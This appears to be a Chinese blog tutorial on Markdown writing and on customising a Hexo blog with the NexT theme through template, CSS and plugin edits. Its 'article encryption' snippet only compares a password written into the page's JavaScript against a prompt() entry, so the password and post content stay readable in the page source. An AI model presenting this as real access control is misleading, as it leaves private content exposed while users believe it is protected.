Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法简洁明了、容易掌握，而且功能比纯文本更强，因此写博客使用它，可以让用户更加专注的写文章，而不需要费尽心力的考虑样式，相对于html已经算是轻量级语言，像有道云笔记也支持Markdown写作。并且Markdown完全兼容html，也就是可以在文章里直接插入html代码。比如给博文添加音乐，就可以直接把音乐的外链html代码插入文章中。具体语法参看：Markdown 语法说明(简体中文版) 可以说十分钟就可以入门。当然，工欲善其事必先利其器，选择一个好的Markdown编辑器也是非常重要的，这里推荐MarkPad 和The Markdown Editor for Windows ，这是带有预览效果的编辑器，也可以使用本地的文本编辑器，更多的Markdown的语法与编辑器自己可以搜索了解。 写博客 至此博客已经搭建完毕，域名也已经正常解析，那么剩下的问题就是更新内容了。 更新文章 在MyBlog目录下执行：hexo new “我的第一篇文章”，会在source_posts文件夹内生成一个.md文件。 编辑该文件（遵循Markdown规则） 修改起始字段 title 文章的标题 date 创建日期 （文件的创建日期 ） updated 修改日期 （ 文件的修改日期） comments 是否开启评论 true or false tags 标签 categories 分类 permalink url中的名字（文件名） 编写正文内容（使用MakeDown语法） hexo clean 删除本地静态文件（Public目录），可不执行。 hexo g 生成本地静态文件（Public目录） hexo deploy 将本地静态文件推送至github（hexo d） 添加菜单 进入theme目录，编辑\next\_config.yml文件，找到menu:字段，在该字段下添加一个字段。1234menu: home: / about: /about ...... 然后到themes\next\languages下找到lanhuages目录，编辑zh-Hans.yml(检查下站点配置文件中的language的值是否为zh-Hans)文件：1234menu: home: 首页 about: 关于作者 ...... 高度定制优化篇文章中添加居中模块 文章Markdown中填写如下：1&lt;blockquote class="blockquote-center"&gt;优秀的人，不是不合群，而是他们合群的人里面没有你&lt;/blockquote&gt; 在文章底部增加版权信息 在目录 next/layout/_macro/下添加 my-copyright.swig：12345678910111213141516171819202122232425262728293031&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;"&gt;&#123;&#123; page.title &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href="/" title="访问 &#123;&#123; theme.author &#125;&#125; 的个人博客"&gt;&#123;&#123; theme.author &#125;&#125;&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;&lt;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;" title="&#123;&#123; page.title &#125;&#125;"&gt;&#123;&#123; page.permalink &#125;&#125;&lt;/a&gt; &lt;span class="copy-path" title="点击复制文章链接"&gt;&lt;i class="fa fa-clipboard" data-clipboard-text="&#123;&#123; page.permalink &#125;&#125;" aria-label="复制成功！"&gt;&lt;/i&gt;&lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard('.fa-clipboard'); clipboard.on('success', $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: '复制成功', html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125; 在目录next/source/css/_common/components/post/下添加my-post-copyright.styl：123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #b5b5b5; font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #a3d2a3; text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 修改next/layout/_macro/post.swig，在代码12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'wechat-subscriber.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 之前添加增加如下代码：12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'my-copyright.swig' %&#125; &#123;% endif %&#125;&lt;/div&gt; 修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码：1@import &quot;my-post-copyright&quot; 如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似：1234567---title:date:tags:categories:copyright: true--- 自定义hexo new生成md文件的选项 在/scaffolds/post.md文件中添加：12345678910---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;tags:categories: copyright: truepermalink: 01top: 0password:--- 隐藏网页底部powered By Hexo / 强力驱动 打开themes/next/layout/_partials/footer.swig,使用隐藏之间的代码即可，或者直接删除。1234567891011&lt;!--&lt;div class="powered-by"&gt; &#123;&#123; __('footer.powered', '&lt;a class="theme-link" rel="external nofollow" href="https://hexo.io"&gt;Hexo&lt;/a&gt;') &#125;&#125;&lt;/div&gt;&lt;div class="theme-info"&gt; &#123;&#123; __('footer.theme') &#125;&#125; - &lt;a class="theme-link" rel="external nofollow" href="https://github.com/iissnan/hexo-theme-next"&gt; NexT.&#123;&#123; theme.scheme &#125;&#125; &lt;/a&gt;&lt;/div&gt;--&gt; 文章加密访问 打开themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件,在meta标签后面插入这样一段代码：12345678910&lt;script&gt; (function()&#123; if('&#123;&#123; page.password &#125;&#125;')&#123; if (prompt('请输入文章密码') !== '&#123;&#123; page.password &#125;&#125;')&#123; alert('密码错误！'); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 然后文章中添加：1password: 你的密码 如果password后面为空，则表示不用密码。 博文置顶 修改 hero-generator-index插件，把文件：node_modules/hexo-generator-index/lib/generator.js内的代码替换为：12345678910111213141516171819202122232425262728'use strict';var pagination = require('hexo-pagination');module.exports = function(locals)&#123; var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; // 两篇文章top都有定义 if(a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 &#125; else if(a.top &amp;&amp; !b.top) &#123; // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; // 都没定义按照文章日期降序排 &#125;); var paginationDir = config.pagination_dir || 'page'; return pagination('', posts, &#123; perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: &#123; __index: true &#125; &#125;);&#125;; 在文章中添加 top 值，数值越大文章越靠前，如:12345---......copyright: truetop: 100--- 默认不设置则为0，数值相同时按时间排序。 添加顶部加载条 打开/themes/next/layout/_partials/head.swig文件，在maximum-scale=1”/&gt;后添加如下代码:12&lt;script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"&gt;&lt;/script&gt;&lt;link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"&gt; 但是，默认的是粉色的，要改变颜色可以在/themes/next/layout/_partials/head.swig文件中添加如下代码（接在刚才link的后面）12345678910111213&lt;style&gt; .pace .pace-progress &#123; background: #1E92FB; /*进度条颜色*/ height: 3px; &#125; .pace .pace-progress-inner &#123; box-shadow: 0 0 10px #1E92FB, 0 0 5px #1E92FB; /*阴影颜色*/ &#125; .pace .pace-activity &#123; border-top-color: #1E92FB; /*上边框颜色*/ border-left-color: #1E92FB; /*左边框颜色*/ &#125;&lt;/style&gt; 添加热度 next主题集成leanCloud，打开/themes/next/layout/_macro/post.swig，在”leancloud-visitors-count”&gt;标签后面添加℃。然后打开，/themes/next/languages/zh-Hans.yml，将visitors内容改为_热度_即可。注： 在主题配置文件中检查leancolud的值是否设置为true，app_id和app_key需要去leancolud 注册，然后创建应用获取。如图: 添加到样式文件 打开themes/next/source/css/_custom/custom.styl，把调试好的样式加进去，保存后Ctrl+F5就能看到效果了，前提是在本地运行的，下面引用了一下别人的一些样式：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980// Custom styles. // 页面头部背景 .header &#123; background:url([http://ojoba1c98.bkt.clouddn.com/img/header/header_background.jpg](http://ojoba1c98.bkt.clouddn.com/img/header/header_background.jpg));&#125;// 子标题 .site-subtitle&#123; font-size: 15px; color: white; &#125; // 标题 .site-title &#123; font-size: 40px; font-weight: bold; &#125; // 标题背景 .brand&#123; background: transparent; &#125; // 菜单栏 .menu &#123; margin-top: 20px; padding-left: 0; text-align: center; background: rgba(240, 240, 240, 0.5); margin-left: auto; margin-right: auto; width: 530px; border-radius: initial; &#125;// 菜单图表链接 以及 超链接样式 a &#123; color: rgba(0,0,0,0.8); &#125; a:hover &#123; color: #ff106c; border-bottom-color: #ff106c; &#125; // 菜单字体大小 .menu .menu-item a &#123; font-size: 14px; &#125; .menu .menu-item a:hover &#123; border-bottom-color: #ff106c; &#125;// 文章背景框框 .post &#123; margin-top: 10px; margin-bottom: 40px; padding: 18px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, 0.8); &#125;// 站点描述 .site-description &#123; font-size: 16px; &#125; // 头部inner .header-inner &#123; padding: 45px 0 25px; width: 700px; &#125; // 作者名 .site-author-name &#123; font-family: 'Comic Sans MS', sans-serif; font-size: 20px; &#125; // 文章之间的分割线 .posts-expand .post-eof &#123; margin: 40px auto 40px; background: white; &#125; // 按钮样式 .btn &#123; margin-top: 20px; &#125; // ``代码块样式 code &#123; color: #E6006B; background: white; border-radius: 3px; &#125; body &#123; color: #444; font-size: 16px; &#125; 好玩的样式 先在themes/next/source/css/_custom/custom.styl中添加以下样式：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221// 下载样式 a#download &#123; display: inline-block; padding: 0 10px; color: #000; background: transparent; border: 2px solid #000; border-radius: 2px; transition: all .5s ease; font-weight: bold; &amp;:hover &#123; background: #000; color: #fff; &#125; &#125; / /颜色块-黄 span#inline-yellow &#123; display:inline; padding:.2em .6em .3em; font-size:80%; font-weight:bold; line-height:1; color:#fff; text-align:center; white-space:nowrap; vertical-align:baseline; border-radius:0; background-color: #f0ad4e; &#125; // 颜色块-绿 span#inline-green &#123; display:inline; padding:.2em .6em .3em; font-size:80%; font-weight:bold; line-height:1; color:#fff; text-align:center; white-space:nowrap; vertical-align:baseline; border-radius:0; background-color: #5cb85c; &#125; // 颜色块-蓝 span#inline-blue &#123; display:inline; padding:.2em .6em .3em; font-size:80%; font-weight:bold; line-height:1; color:#fff; text-align:center; white-space:nowrap; vertical-align:baseline; border-radius:0; background-color: #2780e3; &#125; // 颜色块-紫 span#inline-purple &#123; display:inline; padding:.2em .6em .3em; font-size:80%; font-weight:bold; line-height:1; color:#fff; text-align:center; white-space:nowrap; vertical-align:baseline; border-radius:0; background-color: #9954bb; &#125; // 左侧边框红色块级 p#div-border-left-red &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-left-width: 5px; border-radius: 3px; border-left-color: #df3e3e; &#125; // 左侧边框黄色块级 p#div-border-left-yellow &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-left-width: 5px; border-radius: 3px; border-left-color: #f0ad4e; &#125; // 左侧边框绿色块级 p#div-border-left-green &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-left-width: 5px; border-radius: 3px; border-left-color: #5cb85c; &#125; // 左侧边框蓝色块级 p#div-border-left-blue &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-left-width: 5px; border-radius: 3px; border-left-color: #2780e3; &#125; // 左侧边框紫色块级 p#div-border-left-purple &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-left-width: 5px; border-radius: 3px; border-left-color: #9954bb; &#125; // 右侧边框红色块级 p#div-border-right-red &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-right-width: 5px; border-radius: 3px; border-right-color: #df3e3e; &#125; // 右侧边框黄色块级 p#div-border-right-yellow &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-right-width: 5px; border-radius: 3px; border-right-color: #f0ad4e; &#125; // 右侧边框绿色块级 p#div-border-right-green &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-right-width: 5px; border-radius: 3px; border-right-color: #5cb85c; &#125; // 右侧边框蓝色块级 p#div-border-right-blue &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-right-width: 5px; border-radius: 3px; border-right-color: #2780e3; &#125; // 右侧边框紫色块级 p#div-border-right-purple &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-right-width: 5px; border-radius: 3px; border-right-color: #9954bb; &#125; // 上侧边框红色 p#div-border-top-red &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-top-width: 5px; border-radius: 3px; border-top-color: #df3e3e; &#125; // 上侧边框黄色 p#div-border-top-yellow &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-top-width: 5px; border-radius: 3px; border-top-color: #f0ad4e; &#125; // 上侧边框绿色 p#div-border-top-green &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-top-width: 5px; border-radius: 3px; border-top-color: #5cb85c; &#125; // 上侧边框蓝色 p#div-border-top-blue &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-top-width: 5px; border-radius: 3px; border-top-color: #2780e3; &#125; // 上侧边框紫色 p#div-border-top-purple &#123; display: block; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-top-width: 5px; border-radius: 3px; border-top-color: #9954bb; &#125; 文字增加背景色块站点配置文件，主题配置文件12&lt;span id="inline-blue"&gt;站点配置文件&lt;/span&gt;， &lt;span id="inline-purple"&gt;主题配置文件&lt;/span&gt; 引用边框变色如果没有安装成功，那可能就是墙的原因。建议下载 Node.js 直接安装。 关于更多基本操作和基础知识，请查阅 Hexo) 与 NexT) 官方文档.12&lt;p id="div-border-left-red"&gt;如果没有安装成功，那可能就是墙的原因。建议下载 `Node.js` 直接安装。&lt;/p&gt; &lt;p id="div-border-top-blue"&gt;关于更多基本操作和基础知识，请查阅[Hexo]([https://hexo.io/zh-cn/](https://hexo.io/zh-cn/)) 与[NexT]([http://theme-next.iissnan.com/](http://theme-next.iissnan.com/)) 官方文档.&lt;/p&gt; 在文档中增加图标 支持MarkdownHexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。 一件部署只需一条指令即可部署到Github Pages，或其他网站 丰富的插件Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。123456- &lt;i class="fa fa-pencil"&gt;&lt;/i&gt;支持Markdown &lt;i&gt;Hexo 支持 GitHub Flavored Markdown 的所有功能，甚至可以整合 Octopress 的大多数插件。&lt;/i&gt; - &lt;i class="fa fa-cloud-upload"&gt;&lt;/i&gt;一件部署 &lt;i&gt;只需一条指令即可部署到Github Pages，或其他网站&lt;/i&gt; - &lt;i class="fa fa-cog"&gt;&lt;/i&gt;丰富的插件 &lt;i&gt;Hexo 拥有强大的插件系统，安装插件可以让 Hexo 支持 Jade, CoffeeScript。&lt;/i&gt; &lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-github fa-lg&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-github fa-2x&quot;&gt;&lt;/i&gt; 采用的是Font Awesome的图标。 图形边框效果 Download Now12&lt;a id="download" href="https://git-scm.com/download/win"&gt;&lt;i class="fa fa-download"&gt;&lt;/i&gt;&lt;span&gt; Download Now&lt;/span&gt; &lt;/a&gt; 主页文章添加阴影效果 打开\themes\next\source\css_custom\custom.styl,向里面加入：12345678// 主页文章添加阴影效果 .post &#123; margin-top: 60px; margin-bottom: 60px; padding: 25px; -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5); -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5); &#125; 居中标签居中 修改模板/themes/next/layout/_macro/post.swig，搜索 rel=”tag”&gt;#，将 # 换成 将themes\next\source\css\_common\components\post\post-tags.styl里面的 .post-tags里面的text-align: left; 改成 text-align: center; 阅读更多居中 将themes\next\source\css\_custom\custom.styl 新增：.post-more-link { text-align: center; } 鼠标点击小红心的设置 将 love.js 文件添加到 \themes\next\source\js\src 文件目录下。找到 \themes\next\layout_layout.swing 文件， 在文件的后面， 标签之前 添加以下代码：12&lt;!-- 页面点击小红心 --&gt;&lt;script type="text/javascript" src="/js/src/love.js"&gt;&lt;/script&gt; 为next主题添加nest背景特效 背景的几何线条是采用的nest效果，一个基于html5 canvas绘制的网页背景效果，非常赞！来自github的开源项目canvas-nest 特性 不依赖任何框架或者内库，比如不依赖jQuery，使用原生的javascript。 非常小，只有1.66kb，如果开启gzip，可以更小。 非常容易实现，配置简单，即使你不是web开发者，也能简单搞定。使用非常简单 color: 线条颜色, 默认: ‘0,0,0’ ；三个数字分别为(R,G,B)，注意用,分割 opacity: 线条透明度（0~1）, 默认: 0.5 count: 线条的总数量, 默认: 150 zIndex: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1 如何添加？ 打开next/layout/_layout.swig，在&lt;/body&gt;之前添加如下代码：123&#123;% if theme.canvas_nest %&#125;&lt;script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"&gt;&lt;/script&gt;&#123;% endif %&#125; 修改主题配置文件打开/next/_config.yml，添加/修改以下代码：123456# -------------------------------------------------------------- # background settings # -------------------------------------------------------------- # add canvas-nest effect # see detail from [https://github.com/hustcc/canvas-nest.js](https://github.com/hustcc/canvas-nest.js) canvas_nest: true 至此，大功告成，运行hexo clean 和 hexo g hexo s之后就可以看到效果了 背景的设置 将 particle.js 文件添加到 \themes\next\source\js\src 文件目录下。找到 \themes\next\layout_layout.swing 文件， 在文件的后面，标签之前 添加以下代码：12&lt;!-- 背景动画 --&gt;&lt;script type="text/javascript" src="/js/src/particle.js"&gt;&lt;/script&gt; 修改文章内链接文本样式 将链接文本设置为蓝色，鼠标划过时文字颜色加深，并显示下划线。找到文件 themes\next\source\css_custom\custom.styl ，添加如下 css 样式：12345678.post-body p a &#123; color: #0593d3; border-bottom: none; &amp;:hover &#123; color: #0477ab; text-decoration: underline; &#125;&#125; 搜索功能 安装 hexo-generator-searchdb，在站点的根目录下执行以下命令：1npm install hexo-generator-searchdb --save 编辑 站点配置文件，新增/添加以下内容到任意位置：12345search: path: search.xml field: post format: html limit: 10000 自定义页面 以添加文章阅读统计排行为例，执行hexo new page &quot;count&quot;之后，那怎么在博客中加进去呢？找到\next\_config.yml下的memu，把count加进去：1234567menu: home: / categories: /categories #about: /about archives: /archives tags: /tags count: /count || eye # ||后面为显示的图标 图标网站：http://fontawesome.io/icons/ 在/themes/hexo-theme-next/languages/zh-Hans.yml的目录下，在memu下加一句即可：1count: 琅琊榜 增加阅读排行统计页面 首先我们可以使用leancloud来统计页面阅读数量，以及储存这些信息，然后通过leancloud提供的api编写js脚本来获取阅读数量信息，并展示在页面上。首先新建一个page页面，hexo new page “count”,然后编辑此.md文件，写下：123456789101112131415161718192021222324&lt;script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"&gt;&lt;/script&gt;&lt;script&gt;AV.initialize("app_id", "app_key");&lt;/script&gt; //需要写上leancloud的app_id和app_key&lt;script type="text/javascript"&gt; var time=0 var title="" var url="" var query = new AV.Query('Counter');//表名 query.notEqualTo('id',0); //id不为0的结果 query.descending('time'); //结果按阅读次数降序排序 query.limit(20); //最终只返回10条结果 query.find().then(function (todo) &#123; for (var i=0;i&lt;10;i++)&#123; var result=todo[i].attributes; time=result.time; //阅读次数 title=result.title; //文章标题 url=result.url; //文章url var content="&lt;p&gt;"+"&lt;font color='#0477ab'&gt;"+"【阅读次数:"+time+"】"+"&lt;a href='"+"http://thief.one"+url+"'&gt;"+title+"&lt;/font&gt;"+"&lt;/a&gt;"+"&lt;/p&gt;"; // document.write("&lt;a href='"+"http://thief.one/"+url+"'&gt;"+title+"&lt;/a&gt;"+" Readtimes:"+time+"&lt;br&gt;"); document.getElementById("heheda").innerHTML+=content &#125; &#125;, function (error) &#123; console.log("error"); &#125;);&lt;/script&gt; 注：js里面需要写上leancloud的app_id和app_key最终效果查看： 效果查看 多说替换成来必力评论 多说已经宣布下线了，因此使用来必力评论系统来替换，以下是替换的教程，教程内容来自：https://blog.smoker.cc/web/add-comments-livere-for-hexo-theme-next.html首先在 _config.yml 文件中添加如下配置：1livere_uid: your uid #按照上面链接教程获取 在 layout/_scripts/third-party/comments/ 目录中添加 livere.swig，文件内容如下：1234567891011121314&#123;% if not (theme.duoshuo and theme.duoshuo.shortname) and not theme.duoshuo_shortname and not theme.disqus_shortname and not theme.hypercomments_id and not theme.gentie_productKey %&#125; &#123;% if theme.livere_uid %&#125; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt; &#123;% endif %&#125;&#123;% endif %&#125; 优先使用其他评论插件，如果其他评论插件没有开启，且LiveRe评论插件配置开启了，则使用LiveRe。其中脚本代码为上一步管理页面中获取到的。在layout/_scripts/third-party/comments.swig文件中追加：1&#123;% include './comments/livere.swig' %&#125; 引入 LiveRe 评论插件。最后，在 layout/_partials/comments.swig 文件中条件最后追加LiveRe插件是否引用的判断逻辑：123&#123;% elseif theme.livere_uid %&#125; &lt;div id="lv-container" data-id="city" data-uid="&#123;&#123; theme.livere_uid &#125;&#125;"&gt;&lt;/div&gt;&#123;% endif %&#125; 最后打开博客瞧瞧吧！ 集成Mod分享组件 Step1、获取 AppKey在 Mob 注册账号后，点击头像进入后台，选择 shareSDK 添加一个 Web应用：Step2、在主题配置文件中添加配置：123mob_share: enable: true appkey: ******** Step3、在next/layout/_partials/share/里面添加mob_share.swig：1234567891011121314151617181920212223242526272829303132333435&lt;!--MOB SHARE BEGIN--&gt; &lt;div class="-hoofoo-share-title"&gt;分享到：&lt;/div&gt; &lt;div class="-hoofoo-share-buttons"&gt; &lt;div class="-mob-share-weibo -hoofoo-share-weibo -hoofoo-share-ui-button"&gt;&lt;i class="fa fa-weibo" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class="-mob-share-weixin -hoofoo-share-weixin -hoofoo-share-ui-button"&gt;&lt;i class="fa fa-weixin" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class="-mob-share-qq -hoofoo-share-qq -hoofoo-share-ui-button"&gt;&lt;i class="fa fa-qq" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class="-mob-share-twitter -hoofoo-share-twitter -hoofoo-share-ui-button"&gt;&lt;i class="fa fa-twitter" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class="-hoofoo-share-more -hoofoo-share-ui-button -mob-share-open"&gt;&lt;i class="fa fa-ellipsis-h" aria-hidden="true"&gt;&lt;/i&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class="-mob-share-ui" style="display: none"&gt; &lt;ul class="-mob-share-list"&gt; &lt;li class="-mob-share-weibo"&gt;&lt;p&gt;新浪微博&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-weixin"&gt;&lt;p&gt;微信&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-qzone"&gt;&lt;p&gt;QQ空间&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-qq"&gt;&lt;p&gt;QQ好友&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-tencentweibo"&gt;&lt;p&gt;腾讯微博&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-renren"&gt;&lt;p&gt;人人网&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-kaixin"&gt;&lt;p&gt;开心网&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-douban"&gt;&lt;p&gt;豆瓣&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-youdao"&gt;&lt;p&gt;有道云笔记&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-mingdao"&gt;&lt;p&gt;明道&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-pengyou"&gt;&lt;p&gt;朋友网&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-facebook"&gt;&lt;p&gt;Facebook&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-twitter"&gt;&lt;p&gt;Twitter&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-pocket"&gt;&lt;p&gt;Pocket&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-google"&gt;&lt;p&gt;Google+&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-tumblr"&gt;&lt;p&gt;Tumblr&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-instapaper"&gt;&lt;p&gt;Instapaper&lt;/p&gt;&lt;/li&gt; &lt;li class="-mob-share-linkedin"&gt;&lt;p&gt;Linkedin&lt;/p&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div class="-mob-share-close"&gt;取消&lt;/div&gt; &lt;/div&gt; &lt;div class="-mob-share-ui-bg"&gt;&lt;/div&gt; &lt;script id="-mob-share" src="[http://f1.webshare.mob.com/code/mob-share.js?appkey=&#123;&#123;theme.mob_share.appkey](http://f1.webshare.mob.com/code/mob-share.js?appkey=&#123;&#123;theme.mob_share.appkey)&#125;&#125;"&gt;&lt;/script&gt; &lt;!--MOB SHARE END--&gt; Step4、在next/layout/post.swig中添加条件分支：1234567891011&#123;% if theme.jiathis %&#125; &#123;% include '_partials/share/jiathis.swig' %&#125; &#123;% elseif theme.baidushare %&#125; &#123;% include '_partials/share/baidushare.swig' %&#125; &#123;% elseif theme.add_this_id %&#125; &#123;% include '_partials/share/add-this.swig' %&#125; &#123;% elseif theme.duoshuo_shortname and theme.duoshuo_share %&#125; &#123;% include '_partials/share/duoshuo_share.swig' %&#125; &#123;% elseif theme.mob_share.enable %&#125; &#123;% include '_partials/share/mob_share.swig' %&#125; &#123;% endif %&#125; Step5、在next/source/css/_common/components/third-party/(没有自行创建)里添加样式文件mob_share.styl：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980.-hoofoo-share-buttons&#123; display: inline-block; &#125; .-hoofoo-share-title&#123; font-size: 1.1em; font-weight: 200; &#125; .-hoofoo-share-ui-button&#123; cursor: pointer; background-color: #555; color: #fff; font-size: 24px; line-height: 40px; width: 40px; height: 40px; margin: 10px; border-radius: 25px; float: left; transition: background 0.4s; -moz-transition: background 0.4s; /* Firefox 4 */ -webkit-transition: background 0.4s; /* Safari 和 Chrome */ -o-transition: background 0.4s; &#125; .-hoofoo-share-weibo:hover&#123; background-color: #cf3f41; &#125; .-hoofoo-share-weixin:hover&#123; background-color: #18a01a; &#125; .-hoofoo-share-qq:hover&#123; background-color: #950c0c; &#125; .-hoofoo-share-twitter:hover&#123; background-color: #2ab3e6; &#125; .-hoofoo-share-more:hover&#123; background-color: #777; &#125; .-mob-share-weixin-qrcode-content&#123; border-radius: 4px; -webkit-box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); -moz-box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); -o-box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5); &#125; .-mob-share-weixin-qrcode&#123; margin: 5% !important; width: 90% !important; height: auto 